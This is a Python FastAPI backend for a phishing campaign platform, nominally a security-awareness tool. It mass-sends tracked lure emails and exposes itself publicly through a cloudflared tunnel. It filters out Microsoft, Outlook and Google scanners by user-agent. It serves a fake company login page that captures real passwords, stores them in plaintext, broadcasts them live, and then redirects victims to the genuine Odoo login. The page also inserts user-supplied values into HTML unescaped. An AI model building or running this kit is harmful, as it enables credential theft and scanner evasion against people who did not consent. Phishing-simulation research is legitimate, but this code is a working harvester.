import uuid
import subprocess
import threading
import time
import re
from fastapi import APIRouter, Request, Depends, HTTPException, Response, Query
from fastapi.responses import RedirectResponse, HTMLResponse
from sqlalchemy.orm import Session
from slowapi import Limiter
from slowapi.util import get_remote_address
from pydantic import BaseModel

from app.models.campaign import Campaign
from app.models.credential import Credential
from app.models.event import Event
from app.schemas.phishing import EmailSchema
from app.services.email_service import get_template, send_email_async
from app.websocket.manager import manager
from app.core.dependencies import get_current_organization, get_db
from app.models.organization import Organization

limiter = Limiter(key_func=get_remote_address)
router = APIRouter()

# 🟢 AUTOMATION ENGINE: Cloudflare Tunnel Manager
class TunnelManager:
    def __init__(self):
        self.current_url = "http://localhost:8000"
        self.process = None

    def start_tunnel(self):
        def run():
            try:
                # Launch cloudflared as a subprocess
                cmd = ["cloudflared", "tunnel", "--url", "http://localhost:8000"]
                self.process = subprocess.Popen(
                    cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
                )
                
                # Pattern to match the trycloudflare URL
                url_pattern = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")
                
                for line in iter(self.process.stdout.readline, ""):
                    match = url_pattern.search(line)
                    if match:
                        self.current_url = match.group(0)
                        print(f"[*] AUTOMATED BASE_URL UPDATED: {self.current_url}")
            except FileNotFoundError:
                print("[-] 'cloudflared' not found. Phishing links will use localhost instead of public URLs.")
            except Exception as e:
                print(f"[-] Error starting cloudflared tunnel: {e}")

        thread = threading.Thread(target=run, daemon=True)
        thread.start()

# Initialize and start the tunnel automatically on router load
tunnel = TunnelManager()
tunnel.start_tunnel()

class LoginData(BaseModel):
    email: str
    password: str


# 🟢 BOT DETECTION UTILITY
def is_bot(request: Request):
    ua = request.headers.get("user-agent", "").lower()
    # List of common security scanners and bot signatures
    bot_keywords = [
        "bot", "spider", "crawl", "google", "outlook", "office", "microsoft", 
        "preview", "scanner", "slurp", "bing", "yandex", "facebot", "ia_archiver"
    ]
    # Check if any bot keyword is in User-Agent or if it's not a standard browser
    if any(bot in ua for bot in bot_keywords) or not ua or "mozilla" not in ua:
        return True
    return False

@router.post("/send")
@limiter.limit("5/minute")
async def send_phishing(request: Request, data: EmailSchema, current_org: Organization = Depends(get_current_organization), db: Session = Depends(get_db)):
    # 🟢 MULTI-TENANCY: Assign campaign to current organization or reuse existing
    campaign = None
    if data.campaign_id:
        campaign = db.query(Campaign).filter(Campaign.id == data.campaign_id, Campaign.organization_id == current_org.id).first()
        if campaign:
            campaign.status = "active" # Reactivate if stopped
            campaign.name = data.campaign_name # Update name if changed
            campaign.subject = data.subject    # Save subject
            campaign.template = data.template  # Save template
            db.commit()
            db.refresh(campaign)

    if not campaign:
        campaign = Campaign(
            name=data.campaign_name,
            type="phishing",
            organization_id=current_org.id,
            status="active",
            subject=data.subject,
            template=data.template
        )
        db.add(campaign)
        db.commit()
        db.refresh(campaign)
    # 🟢 Use the Dynamic Tunnel URL
    base_url = tunnel.current_url

    # 🟢 Clean and parse email addresses (handle commas, newlines, spaces)
    emails_list = []
    for raw in data.emails:
        for addr in re.split(r'[,\s\n\r]+', raw):
            addr = addr.strip()
            if addr and "@" in addr:
                emails_list.append(addr)

    for email in emails_list:
        tracking_id = str(uuid.uuid4())[:8]
        click_link = f"{base_url}/phishing/click/{campaign.id}/{tracking_id}?email={email}"
        open_pixel = f"{base_url}/phishing/open/{campaign.id}/{tracking_id}?email={email}"

        html_content = get_template(data.template, email.split("@")[0], click_link)
        # Ensure pixel is a block to help bypass some basic filters
        html_content += f'<img src="{open_pixel}" width="1" height="1" style="display:block; border:0;" />'

        await send_email_async(email, data.subject, html_content)
        
        db.add(Event(campaign_id=campaign.id, organization_id=current_org.id, user_email=email, event_type="sent", ip_address="local"))
        
        await manager.broadcast({
            "type": "sent", 
            "email": email, 
            "tracking_id": tracking_id
        })

    db.commit()
    await manager.broadcast({"type": "campaign_update"})
    return {"message": "Emails sent", "campaign_id": campaign.id, "tunnel": base_url}

@router.post("/{campaign_id}/stop")
async def stop_campaign(campaign_id: int, current_org: Organization = Depends(get_current_organization), db: Session = Depends(get_db)):
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id, Campaign.organization_id == current_org.id).first()
    if not campaign:
        raise HTTPException(status_code=404, detail="Campaign not found")
    campaign.status = "stopped"
    db.commit()
    await manager.broadcast({"type": "campaign_update"})
    return {"status": "success", "message": "Campaign stopped", "campaign_id": campaign_id}

class BulkDeleteSchema(BaseModel):
    campaign_ids: list[int]

@router.delete("/delete/all")
async def delete_all_campaigns(current_org: Organization = Depends(get_current_organization), db: Session = Depends(get_db)):
    campaign_ids = [c.id for c in db.query(Campaign.id).filter(Campaign.organization_id == current_org.id).all()]
    if campaign_ids:
        db.query(Event).filter(Event.campaign_id.in_(campaign_ids)).delete(synchronize_session=False)
        db.query(Credential).filter(Credential.campaign_id.in_(campaign_ids)).delete(synchronize_session=False)
        db.query(Campaign).filter(Campaign.id.in_(campaign_ids)).delete(synchronize_session=False)
        db.commit()
    manager.reset_counters()
    await manager.broadcast({"type": "campaign_update"})
    return {"status": "success", "message": "All campaigns deleted"}

@router.post("/delete/bulk")
async def delete_bulk_campaigns(data: BulkDeleteSchema, current_org: Organization = Depends(get_current_organization), db: Session = Depends(get_db)):
    valid_ids = [c.id for c in db.query(Campaign.id).filter(Campaign.id.in_(data.campaign_ids), Campaign.organization_id == current_org.id).all()]
    if valid_ids:
        db.query(Event).filter(Event.campaign_id.in_(valid_ids)).delete(synchronize_session=False)
        db.query(Credential).filter(Credential.campaign_id.in_(valid_ids)).delete(synchronize_session=False)
        db.query(Campaign).filter(Campaign.id.in_(valid_ids)).delete(synchronize_session=False)
        db.commit()
    await manager.broadcast({"type": "campaign_update"})
    return {"status": "success", "message": f"{len(valid_ids)} campaigns deleted", "deleted_count": len(valid_ids)}

@router.delete("/{campaign_id}")
async def delete_campaign(campaign_id: int, current_org: Organization = Depends(get_current_organization), db: Session = Depends(get_db)):
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id, Campaign.organization_id == current_org.id).first()
    if not campaign:
        raise HTTPException(status_code=404, detail="Campaign not found")
    db.query(Event).filter(Event.campaign_id == campaign_id).delete(synchronize_session=False)
    db.query(Credential).filter(Credential.campaign_id == campaign_id).delete(synchronize_session=False)
    db.delete(campaign)
    db.commit()
    await manager.broadcast({"type": "campaign_update"})
    return {"status": "success", "message": "Campaign deleted", "campaign_id": campaign_id}

@router.get("/open/{campaign_id}/{tracking_id}")
async def track_open(campaign_id: int, tracking_id: str, email: str, request: Request, db: Session = Depends(get_db)):
    # 🟢 Bot Filtering
    if is_bot(request):
        print(f"[BOT] Bot detected in OPEN for {email}. Ignoring stats update.")
        return Response(status_code=204)

    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()
    if not campaign or campaign.status == "stopped":
        return Response(status_code=204)
    org_id = campaign.organization_id if campaign else None

    ip_address = request.client.host if request.client else "unknown"
    db.add(Event(campaign_id=campaign_id, organization_id=org_id, user_email=email, event_type="opened", ip_address=ip_address))
    db.commit()
    await manager.broadcast({"type": "opened", "email": email, "tracking_id": tracking_id})
    return Response(status_code=204)

@router.get("/click/{campaign_id}/{tracking_id}")
async def track_click(campaign_id: int, tracking_id: str, request: Request, email: str = Query(None), db: Session = Depends(get_db)):
    campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()
    if not campaign or campaign.status == "stopped":
        return HTMLResponse(content="<h1>Campaign Inactive</h1><p>This security awareness exercise has concluded.</p>", status_code=200)

    # Determine base URL for redirect - prefer tunnel URL unless it points to localhost
    base_url = tunnel.current_url
    if "localhost" in base_url:
        # Use the host from the incoming request (includes scheme and port)
        base_url = str(request.base_url).rstrip('/')

    redirect_url = f"{base_url}/phishing-site/login.html?cid={campaign_id}&tid={tracking_id}&email={email}"

    # 🟢 Bot Filtering
    if is_bot(request):
        print(f"[BOT] Bot detected in CLICK for {email}. Redirecting without database log.")
        return RedirectResponse(url=redirect_url)

    org_id = campaign.organization_id if campaign else None

    ip_address = request.client.host if request.client else "unknown"
    db.add(Event(campaign_id=campaign_id, organization_id=org_id, user_email=email, event_type="clicked", ip_address=ip_address))
    db.commit()
    await manager.broadcast({"type": "clicked", "email": email, "tracking_id": tracking_id})

    return RedirectResponse(url=redirect_url)

@router.post("/submit/{campaign_id}")
async def capture_credentials(campaign_id: int, data: LoginData, db: Session = Depends(get_db), request: Request = None):
    try:
        ip = request.client.host if request and request.client else "unknown"
        tid = request.query_params.get("tid", "unknown") if request else "unknown"

        campaign = db.query(Campaign).filter(Campaign.id == campaign_id).first()
        if not campaign or campaign.status == "stopped":
            raise HTTPException(status_code=400, detail="This campaign has been stopped.")
        org_id = campaign.organization_id if campaign else None

        db.add(Credential(campaign_id=campaign_id, organization_id=org_id, user_email=data.email, captured_data=data.password))
        db.add(Event(campaign_id=campaign_id, organization_id=org_id, user_email=data.email, event_type="submitted", ip_address=ip))
        db.commit()

        await manager.broadcast({
            "type": "submitted",
            "email": data.email, 
            "password": data.password,
            "tracking_id": tid,
            "campaign_id": campaign_id
        })
        return {"status": "success"}
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail=str(e))

@router.get("/login-portal", response_class=HTMLResponse)
async def login_portal(cid: int, tid: str, email: str):
    return f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login | Relish Tech Global</title>
        <style>
            body {{ font-family: sans-serif; background-color: #ffffff; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }}
            .header {{ padding: 10px 50px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e5e7eb; }}
            .logo-text {{ font-weight: bold; font-size: 20px; color: #714b67; letter-spacing: 2px; }}
            .login-container {{ flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px 0; }}
            .login-card {{ width: 100%; max-width: 350px; }}
            input {{ width: 100%; padding: 12px; margin-bottom: 20px; border: 1px solid #d1d5db; border-radius: 4px; box-sizing: border-box; }}
            .btn-login {{ width: 100%; padding: 12px; background-color: #714b67; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }}
        </style>
    </head>
    <body>
        <div class="header"><div class="logo-text">RELISH</div></div>
        <div class="login-container">
            <div class="login-card">
                <form id="pForm">
                    <label style="font-size:14px; color:#111827;">Email</label>
                    <input type="email" id="u" value="{email}" required />
                    <label style="font-size:14px; color:#111827;">Password</label>
                    <input type="password" id="p" placeholder="Password" required autofocus />
                    <button type="submit" class="btn-login">Log in</button>
                </form>
            </div>
        </div>
        <script>
            document.getElementById('pForm').addEventListener('submit', async (e) => {{
                e.preventDefault();
                const payload = {{
                    email: document.getElementById('u').value,
                    password: document.getElementById('p').value
                }};
                try {{
                    const res = await fetch('/phishing/submit/{cid}?tid={tid}', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify(payload)
                    }});
                    window.location.href = "https://odoo.relishtechglobal.com/web/login";
                }} catch (err) {{
                    window.location.href = "https://odoo.relishtechglobal.com/web/login";
                }}
            }});
        </script>
    </body>
    </html>
    """